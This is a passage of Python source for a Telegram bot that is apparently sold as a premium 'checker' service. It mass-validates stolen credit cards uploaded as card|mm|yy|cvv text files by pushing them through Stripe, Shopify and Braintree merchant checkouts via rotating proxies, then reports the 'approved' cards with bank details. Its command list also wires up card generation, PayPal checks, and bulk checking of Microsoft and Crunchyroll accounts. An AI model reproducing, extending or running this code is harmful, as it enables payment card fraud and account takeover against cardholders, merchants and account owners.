            "   🗑️ 𝗥𝗘𝗠𝗢𝗩𝗘 𝗚𝗥𝗢𝗨𝗣\n"
            "╚══════════════════════════════╝\n\n"
            "📝 Usage:\n"
            "`/removegroup <group_id>`\n\n"
            "Example:\n"
            "`/removegroup -1001234567890`\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "💡 Use /groups to see all group IDs"
        )
        return
    
    try:
        group_id = context.args[0]
        
        from access_control import load_access_data, save_access_data
        data = load_access_data()
        
        if group_id not in data['authorized_groups']:
            await update.message.reply_text("❌ This group is not in the authorized list!")
            return
        
        group_info = data['authorized_groups'][group_id]
        del data['authorized_groups'][group_id]
        save_access_data(data)
        
        await update.message.reply_text(
            "╔══════════════════════════════╗\n"
            "   ✅ 𝗚𝗥𝗢𝗨𝗣 𝗥𝗘𝗠𝗢𝗩𝗘𝗗\n"
            "╚══════════════════════════════╝\n\n"
            f"🆔 Group ID: `{group_id}`\n"
            f"🔗 Link: {group_info.get('invite_link', 'N/A')}\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "✅ Users can no longer use the bot in this group.",
            parse_mode='Markdown'
        )
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Redeem a premium key - /redeem <key>"""
    if not context.args:
        await update.message.reply_text(
            "Usage: /redeem <key>\n"
            "Example: /redeem premium_abc123xyz456"
        )
        return
    
    key_code = context.args[0]
    user_id = update.effective_user.id
    username = update.effective_user.username or update.effective_user.first_name
    
    success, message = redeem_key(key_code, user_id, username)
    
    if success:
        await update.message.reply_text(
            f"🎉 **Premium Activated!**\n\n"
            f"{message}\n\n"
            "✨ You can now use the bot in private messages!"
        )
    else:
        await update.message.reply_text(message)

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle document/file uploads - store file info for mass checking"""
    if not update.message or not update.message.document:
        return
    
    document = update.message.document
    file_name = document.file_name
    
    if not file_name.endswith('.txt'):
        await update.message.reply_text(
            "⚠️ Please send a .txt file containing credit cards.\n"
            "Format: card|mm|yy|cvv (one per line)"
        )
        return
    
    context.user_data['cc_file'] = {
        'file_id': document.file_id,
        'file_name': file_name,
        'message_id': update.message.message_id
    }

def parse_cards_from_text(text):
    """Parse credit cards from text content"""
    cards = []
    card_pattern = re.compile(r'(\d{15,16})[|:](\d{1,2})[|:](\d{2,4})[|:](\d{3,4})')
    matches = card_pattern.findall(text)
    
    for match in matches:
        card_num, month, year, cvv = match
        if len(year) == 4:
            year = year[-2:]
        month = month.zfill(2)
        cards.append(f"{card_num}|{month}|{year}|{cvv}")
    
    return cards

async def mass_check_stripe_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass check Stripe cards from file with live updates"""
    if not update.message.reply_to_message:
        return
    
    sys.path.insert(0, 'gates/stripe')
    import config_manager
    from gates.stripe.main import process_stripe_card, parse_card_data, get_bin_info
    
    reply_to_id = update.message.reply_to_message.message_id
    
    file_info = None
    if 'cc_file' in context.user_data and context.user_data['cc_file'].get('message_id') == reply_to_id:
        file_info = context.user_data['cc_file']
    
    if not file_info:
        raise ApplicationHandlerStop
    
    try:
        file = await context.bot.get_file(file_info['file_id'])
        file_content = await file.download_as_bytearray()
        text_content = file_content.decode('utf-8', errors='ignore')
        
        cards = parse_cards_from_text(text_content)
        
        if not cards:
            await update.message.reply_text("❌ No valid cards found in the file!")
            return
        
        user_id = update.effective_user.id
        username = update.effective_user.username
        is_user_admin = is_admin(user_id, username)
        
        max_cards = len(cards) if is_user_admin else min(len(cards), 50)
        cards = cards[:max_cards]
        
        config = config_manager.get_config()
        stripe_url = config.stripe_url
        auth_mode = config.auth_mode
        shared_email = config.shared_email
        shared_password = config.shared_password
        
        if not stripe_url:
            await update.message.reply_text(
                "⚠️ Stripe URL not configured.\nPlease set it using: /setsurl <url>"
            )
            return
        
        approved_count = 0
        declined_count = 0
        checked_count = 0
        total_cards = len(cards)
        
        keyboard = [
            [InlineKeyboardButton(f"✅ Approved: {approved_count}", callback_data="null"),
             InlineKeyboardButton(f"❌ Declined: {declined_count}", callback_data="null")],
            [InlineKeyboardButton(f"🔄 Checked: {checked_count}/{total_cards}", callback_data="null"),
             InlineKeyboardButton(f"⏳ Left: {total_cards}", callback_data="null")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        status_msg = await update.message.reply_text(
            f"⚡ 𝗠𝗔𝗦𝗦 𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 - Stripe Auth\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"📊 Total Cards: {total_cards}\n"
            f"🔄 Status: Processing...",
            reply_markup=reply_markup
        )
        
        req_by = f"@{update.effective_user.username}" if update.effective_user.username else update.effective_user.first_name
        
        for i, card_str in enumerate(cards, 1):
            card_data = parse_card_data(card_str)
            if not card_data:
                continue
            
            start_time = time.time()
            bin_info = await get_bin_info(card_data['number'][:6])
            
            is_approved, response_msg = await process_stripe_card(
                stripe_url,
                card_data,
                auth_mode=auth_mode,
                shared_email=shared_email,
                shared_password=shared_password
            )
            
            checked_count += 1
            
            if is_approved:
                approved_count += 1
                time_taken = round(time.time() - start_time, 2)
                
                card_display = f"{card_data['number']}|{card_data['exp_month']}|{card_data['exp_year']}|{card_data['cvc']}"
                bin_number = card_data['number'][:6]
                
                success_msg = f"""み ¡@TOjiCHKBot ↯ ↝ 𝙍𝙚𝙨𝙪𝙡𝙩
Stripe Auth
━━━━━━━━━
𝐂𝐂 ➜ <code>{card_display}</code>
𝐒𝐓𝐀𝐓𝐔𝐒 ➜ APPROVED ✅
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➜ {response_msg}
━━━━━━━━━
𝐁𝐈𝐍 ➜ {bin_number}
𝐓𝐘𝐏𝐄 ➜ {bin_info.get('type', 'N/A')}
𝐂𝐎𝐔𝐍𝐓𝐑𝐘 ➜ {bin_info.get('country', 'N/A')}
𝐁𝐀𝐍𝐊 ➜ {bin_info.get('bank', 'N/A')}
━━━━━━━━━
𝗧/𝘁 : {time_taken}s
𝐑𝐄𝐐 : {req_by}
𝐃𝐄𝐕 : @mumiru
"""
                await update.message.reply_text(success_msg, parse_mode='HTML')
            else:
                declined_count += 1
            
            left_count = total_cards - checked_count
            
            keyboard = [
                [InlineKeyboardButton(f"✅ Approved: {approved_count}", callback_data="null"),
                 InlineKeyboardButton(f"❌ Declined: {declined_count}", callback_data="null")],
                [InlineKeyboardButton(f"🔄 Checked: {checked_count}/{total_cards}", callback_data="null"),
                 InlineKeyboardButton(f"⏳ Left: {left_count}", callback_data="null")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            try:
                await status_msg.edit_text(
                    f"⚡ 𝗠𝗔𝗦𝗦 𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 - Stripe Auth\n"
                    f"━━━━━━━━━━━━━━━━━━━━━\n"
                    f"📊 Total Cards: {total_cards}\n"
                    f"🔄 Status: Checking #{checked_count}...",
                    reply_markup=reply_markup
                )
            except:
                pass
            
            await asyncio.sleep(2.5)
        
        keyboard = [
            [InlineKeyboardButton(f"✅ Approved: {approved_count}", callback_data="null"),
             InlineKeyboardButton(f"❌ Declined: {declined_count}", callback_data="null")],
            [InlineKeyboardButton(f"🔄 Checked: {checked_count}/{total_cards}", callback_data="null"),
             InlineKeyboardButton(f"⏳ Left: 0", callback_data="null")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await status_msg.edit_text(
            f"✅ 𝗠𝗔𝗦𝗦 𝗖𝗛𝗘𝗖𝗞 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘 - Stripe Auth\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"📊 Total: {total_cards} | ✅ Approved: {approved_count} | ❌ Declined: {declined_count}\n"
            f"🎯 Success Rate: {round((approved_count/total_cards)*100, 1)}%",
            reply_markup=reply_markup
        )
        
    except Exception as e:
        logger.error(f"Error in mass check: {e}")
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def mass_check_shopify_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass check Shopify cards from file with live updates"""
    if not update.message.reply_to_message:
        return
    
    sys.path.insert(0, 'gates/shopify')
    from gates.shopify.main import GLOBAL_SETTINGS, get_next_proxy
    from shopify_auto_checkout import ShopifyChecker
    import httpx
    
    reply_to_id = update.message.reply_to_message.message_id
    
    file_info = None
    if 'cc_file' in context.user_data and context.user_data['cc_file'].get('message_id') == reply_to_id:
        file_info = context.user_data['cc_file']
    
    if not file_info:
        raise ApplicationHandlerStop
    
    if not GLOBAL_SETTINGS.get('url'):
        await update.message.reply_text("❌ No Shopify URL set! Use /seturl first.")
        return
    
    try:
        file = await context.bot.get_file(file_info['file_id'])
        file_content = await file.download_as_bytearray()
        text_content = file_content.decode('utf-8', errors='ignore')
        
        cards = parse_cards_from_text(text_content)
        
        if not cards:
            await update.message.reply_text("❌ No valid cards found in the file!")
            return
        
        user_id = update.effective_user.id
        username = update.effective_user.username
        is_user_admin = is_admin(user_id, username)
        
        max_cards = len(cards) if is_user_admin else min(len(cards), 50)
        cards = cards[:max_cards]
        
        approved_count = 0
        declined_count = 0
        checked_count = 0
        total_cards = len(cards)
        
        keyboard = [
            [InlineKeyboardButton(f"✅ Approved: {approved_count}", callback_data="null"),
             InlineKeyboardButton(f"❌ Declined: {declined_count}", callback_data="null")],
            [InlineKeyboardButton(f"🔄 Checked: {checked_count}/{total_cards}", callback_data="null"),
             InlineKeyboardButton(f"⏳ Left: {total_cards}", callback_data="null")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        status_msg = await update.message.reply_text(
            f"⚡ 𝗠𝗔𝗦𝗦 𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 - Shopify\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"📊 Total Cards: {total_cards}\n"
            f"🔄 Status: Processing...",
            reply_markup=reply_markup
        )
        
        req_by = f"@{update.effective_user.username}" if update.effective_user.username else update.effective_user.first_name
        
        for i, card_str in enumerate(cards, 1):
            parts = card_str.split('|')
            if len(parts) != 4:
                continue
            
            card_num, month, year, cvv = parts
            
            start_time = time.time()
            proxy = get_next_proxy()
            
            try:
                async with httpx.AsyncClient(timeout=10.0) as client:
                    bin_response = await client.get(f"https://bins.antipublic.cc/bins/{card_num[:6]}")
                    bin_info = bin_response.json() if bin_response.status_code == 200 else {}
            except:
                bin_info = {}
            
            result = "Unknown Error"
            
            try:
                checker = ShopifyChecker(proxy=proxy)
                result_data = await asyncio.wait_for(
                    checker.check_card(
                        site_url=GLOBAL_SETTINGS['url'],
                        card_num=card_num,
                        month=month,
                        year=year,
                        cvv=cvv
                    ),
                    timeout=30.0
                )
                
                if isinstance(result_data, dict):
                    result = result_data.get('message', 'Card Declined')
                elif isinstance(result_data, str):
                    result = result_data
                elif result_data is None:
                    result = "No Response"
                else:
                    result = "Card Declined"
            except asyncio.TimeoutError:
                result = "Timeout"
            except Exception as e:
                result = f"Error: {str(e)}"
                logger.error(f"Shopify check error for card {card_num[:6]}**: {e}")
            
            checked_count += 1
            
            if not result or not isinstance(result, str):
                result = "Unknown Error"
            
            result_lower = str(result).lower()
            is_approved = "✅" in result or "charged" in result_lower or "order placed" in result_lower or "card live" in result_lower or "approved" in result_lower
            
            if is_approved:
                approved_count += 1
                time_taken = round(time.time() - start_time, 2)
                
                bin_num = card_num[:6]
                brand = bin_info.get('brand', 'N/A')
                card_type = bin_info.get('type', 'N/A')
                country_flag = bin_info.get('country_flag', '')
                country_name = bin_info.get('country_name', 'N/A')
                bank = bin_info.get('bank', 'N/A')
                country_display = f"{country_flag} {country_name}"
                
                success_msg = f"""み ¡@TOjiCHKBot ↯ ↝ 𝙍𝙚𝙨𝙪𝙡𝙩
𝗦𝗛𝗢𝗣𝗜𝗙𝗬
━━━━━━━━━
𝐂𝐂 ➜ <code>{card_str}</code>
𝐒𝐓𝐀𝐓𝐔𝐒 ➜ APPROVED ✅
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➜ {result}
━━━━━━━━━
𝐁𝐈𝐍 ➜ {bin_num}
𝐓𝐘𝐏𝐄 ➜ {card_type}
𝐂𝐎𝐔𝐍𝐓𝐑𝐘 ➜ {country_display}
𝐁𝐀𝐍𝐊 ➜ {bank}
━━━━━━━━━
𝗧/𝘁 : {time_taken}s
𝐑𝐄𝐐 : {req_by}
𝐃𝐄𝐕 : @MUMIRU
"""
                await update.message.reply_text(success_msg, parse_mode='HTML')
            else:
                declined_count += 1
            
            left_count = total_cards - checked_count
            
            keyboard = [
                [InlineKeyboardButton(f"✅ Approved: {approved_count}", callback_data="null"),
                 InlineKeyboardButton(f"❌ Declined: {declined_count}", callback_data="null")],
                [InlineKeyboardButton(f"🔄 Checked: {checked_count}/{total_cards}", callback_data="null"),
                 InlineKeyboardButton(f"⏳ Left: {left_count}", callback_data="null")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            try:
                await status_msg.edit_text(
                    f"⚡ 𝗠𝗔𝗦𝗦 𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 - Shopify\n"
                    f"━━━━━━━━━━━━━━━━━━━━━\n"
                    f"📊 Total Cards: {total_cards}\n"
                    f"🔄 Status: Checking #{checked_count}...",
                    reply_markup=reply_markup
                )
            except:
                pass
            
            await asyncio.sleep(2.5)
        
        keyboard = [
            [InlineKeyboardButton(f"✅ Approved: {approved_count}", callback_data="null"),
             InlineKeyboardButton(f"❌ Declined: {declined_count}", callback_data="null")],
            [InlineKeyboardButton(f"🔄 Checked: {checked_count}/{total_cards}", callback_data="null"),
             InlineKeyboardButton(f"⏳ Left: 0", callback_data="null")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await status_msg.edit_text(
            f"✅ 𝗠𝗔𝗦𝗦 𝗖𝗛𝗘𝗖𝗞 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘 - Shopify\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"📊 Total: {total_cards} | ✅ Approved: {approved_count} | ❌ Declined: {declined_count}\n"
            f"🎯 Success Rate: {round((approved_count/total_cards)*100, 1)}%",
            reply_markup=reply_markup
        )
        
    except Exception as e:
        logger.error(f"Error in mass check: {e}")
        await update.message.reply_text(f"❌ Error: {str(e)}")

def main():
    application = Application.builder().token(BOT_TOKEN).concurrent_updates(True).build()
    
    auth_handler = ConversationHandler(
        entry_points=[CommandHandler('setauth', setauth_command)],
        states={
            AWAITING_AUTH_MODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_auth_mode)],
            AWAITING_CREDENTIALS: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_credentials)],
        },
        fallbacks=[CommandHandler('cancel', stripe_cancel)],
    )
    
    braintree_url_handler = ConversationHandler(
        entry_points=[CommandHandler('setburl', braintree_setburl)],
        states={
            BRAINTREE_AWAITING_AUTH_MODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, braintree_receive_auth_mode)],
            BRAINTREE_AWAITING_CREDENTIALS: [MessageHandler(filters.TEXT & ~filters.COMMAND, braintree_receive_credentials)],
        },
        fallbacks=[CommandHandler('cancel', cancel_braintree)],
    )
    
    addgroup_handler = ConversationHandler(
        entry_points=[CommandHandler('addgroup', addgroup_start)],
        states={
            WAITING_GROUP_LINK: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_group_link)],
            WAITING_GROUP_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_group_id)],
        },
        fallbacks=[CommandHandler('cancel', cancel_addgroup)],
    )
    
    gbin_handler = ConversationHandler(
        entry_points=[CommandHandler('gbin', gbin_start)],
        states={
            GBIN_WAITING_TYPE: [MessageHandler(filters.TEXT & ~filters.COMMAND, gbin_receive_type)],
            GBIN_WAITING_DIGITS: [MessageHandler(filters.TEXT & ~filters.COMMAND, gbin_receive_digits)],
        },
        fallbacks=[CommandHandler('cancel', cancel_gbin)],
    )
    
    microsoft_handler = ConversationHandler(
        entry_points=[CommandHandler('mss', check_microsoft_mass)],
        states={
            MS_WAITING_ACCOUNTS: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_microsoft_accounts),
                MessageHandler(filters.Document.ALL, receive_microsoft_accounts),
            ],
        },
        fallbacks=[CommandHandler('cancel', cancel_microsoft)],
    )
    
    # Add reply handler for /mss command (must be before the conversation handler)
    mss_reply_handler = MessageHandler(
        filters.REPLY & filters.COMMAND & filters.Regex(r'^/mss'),
        mass_check_microsoft_file
    )
    
    crunchyroll_handler = ConversationHandler(
        entry_points=[CommandHandler('mcr', check_crunchyroll_mass)],
        states={
            CR_WAITING_ACCOUNTS: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_crunchyroll_accounts),
                MessageHandler(filters.Document.ALL, receive_crunchyroll_accounts),
            ],
        },
        fallbacks=[CommandHandler('cancel', cancel_crunchyroll)],
    )
    
    application.add_handler(MessageHandler(filters.ALL, enforce_access_control), group=-1)
    application.add_handler(CallbackQueryHandler(enforce_access_control), group=-1)
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("register", register))
    application.add_handler(CommandHandler("cmd", cmd))
    application.add_handler(CommandHandler("cmds", cmd))
    application.add_handler(MessageHandler(filters.TEXT & filters.Regex(r'^\.cmd(s)?$'), cmd))
    application.add_handler(CommandHandler("bin", bin_check))
    application.add_handler(CommandHandler("mbin", mbin_check))
    application.add_handler(CommandHandler("gen", gen_card))
    application.add_handler(CommandHandler("fake", fake_command))
    application.add_handler(CommandHandler("sk", sk_command))
    application.add_handler(CommandHandler("me", me_info))
    application.add_handler(CommandHandler("info", info_cmd))
    application.add_handler(CommandHandler("clean", clean_file))
    application.add_handler(CommandHandler("split", split_file))
    application.add_handler(CommandHandler("chk", check_stripe))
    application.add_handler(MessageHandler(filters.REPLY & filters.COMMAND & filters.Regex(r'^/mchk'), mass_check_stripe_file))
    application.add_handler(CommandHandler("mchk", check_stripe_mass))
    application.add_handler(CommandHandler("setsurl", setsurl_command))
    application.add_handler(CommandHandler("sh", check_shopify))
    application.add_handler(MessageHandler(filters.REPLY & filters.COMMAND & filters.Regex(r'^/msh'), mass_check_shopify_file))
    application.add_handler(CommandHandler("msh", check_shopify_mass))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    application.add_handler(CommandHandler("seturl", shopify_seturl))
    application.add_handler(CommandHandler("myurl", shopify_myurl))
    application.add_handler(CommandHandler("rmurl", shopify_rmurl))
    application.add_handler(CommandHandler("addp", shopify_addp))
    application.add_handler(CommandHandler("rp", shopify_rp))
    application.add_handler(CommandHandler("lp", shopify_lp))
    application.add_handler(CommandHandler("cp", shopify_cp))
    application.add_handler(CommandHandler("chkurl", shopify_chkurl))
    application.add_handler(CommandHandler("mchku", shopify_mchku))
    application.add_handler(CommandHandler("br", check_braintree))
    application.add_handler(braintree_url_handler)
    application.add_handler(CommandHandler("myburl", braintree_myburl))
    application.add_handler(CommandHandler("rmburl", braintree_rmburl))
    application.add_handler(CommandHandler("baddp", braintree_baddp))
    application.add_handler(CommandHandler("brp", braintree_brp))
    application.add_handler(CommandHandler("blp", braintree_blp))
    application.add_handler(CommandHandler("bcp", braintree_bcp))
    application.add_handler(CommandHandler("chkburl", braintree_chkburl))
    application.add_handler(CommandHandler("mbchku", braintree_mbchku))
    application.add_handler(CommandHandler("pp", check_paypal))
    application.add_handler(CommandHandler("paypal", check_paypal))
    application.add_handler(CommandHandler("mpp", check_paypal_mass))
    application.add_handler(CommandHandler("mpaypal", check_paypal_mass))
    application.add_handler(CommandHandler("cr", check_crunchyroll))
    application.add_handler(crunchyroll_handler)
    application.add_handler(CommandHandler("ms", check_microsoft))
    application.add_handler(mss_reply_handler)
    application.add_handler(microsoft_handler)
    application.add_handler(CommandHandler("smp", set_ms_proxy))
    application.add_handler(CommandHandler("site", site_gate_analyze))
    application.add_handler(CommandHandler("msite", site_gate_mass))
    application.add_handler(CommandHandler("key", key_command))
    application.add_handler(CommandHandler("redeem", redeem_command))
    application.add_handler(CommandHandler("broadcast", broadcast_command))
    application.add_handler(CommandHandler("stats", stats_command))
    application.add_handler(CommandHandler("users", users_command))
    application.add_handler(CommandHandler("groups", groups_command))
    application.add_handler(CommandHandler("removegroup", removegroup_command))
    application.add_handler(auth_handler)
    application.add_handler(addgroup_handler)
    application.add_handler(gbin_handler)
    application.add_handler(CallbackQueryHandler(button_callback))
    
    logger.info("Bot started successfully!")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()
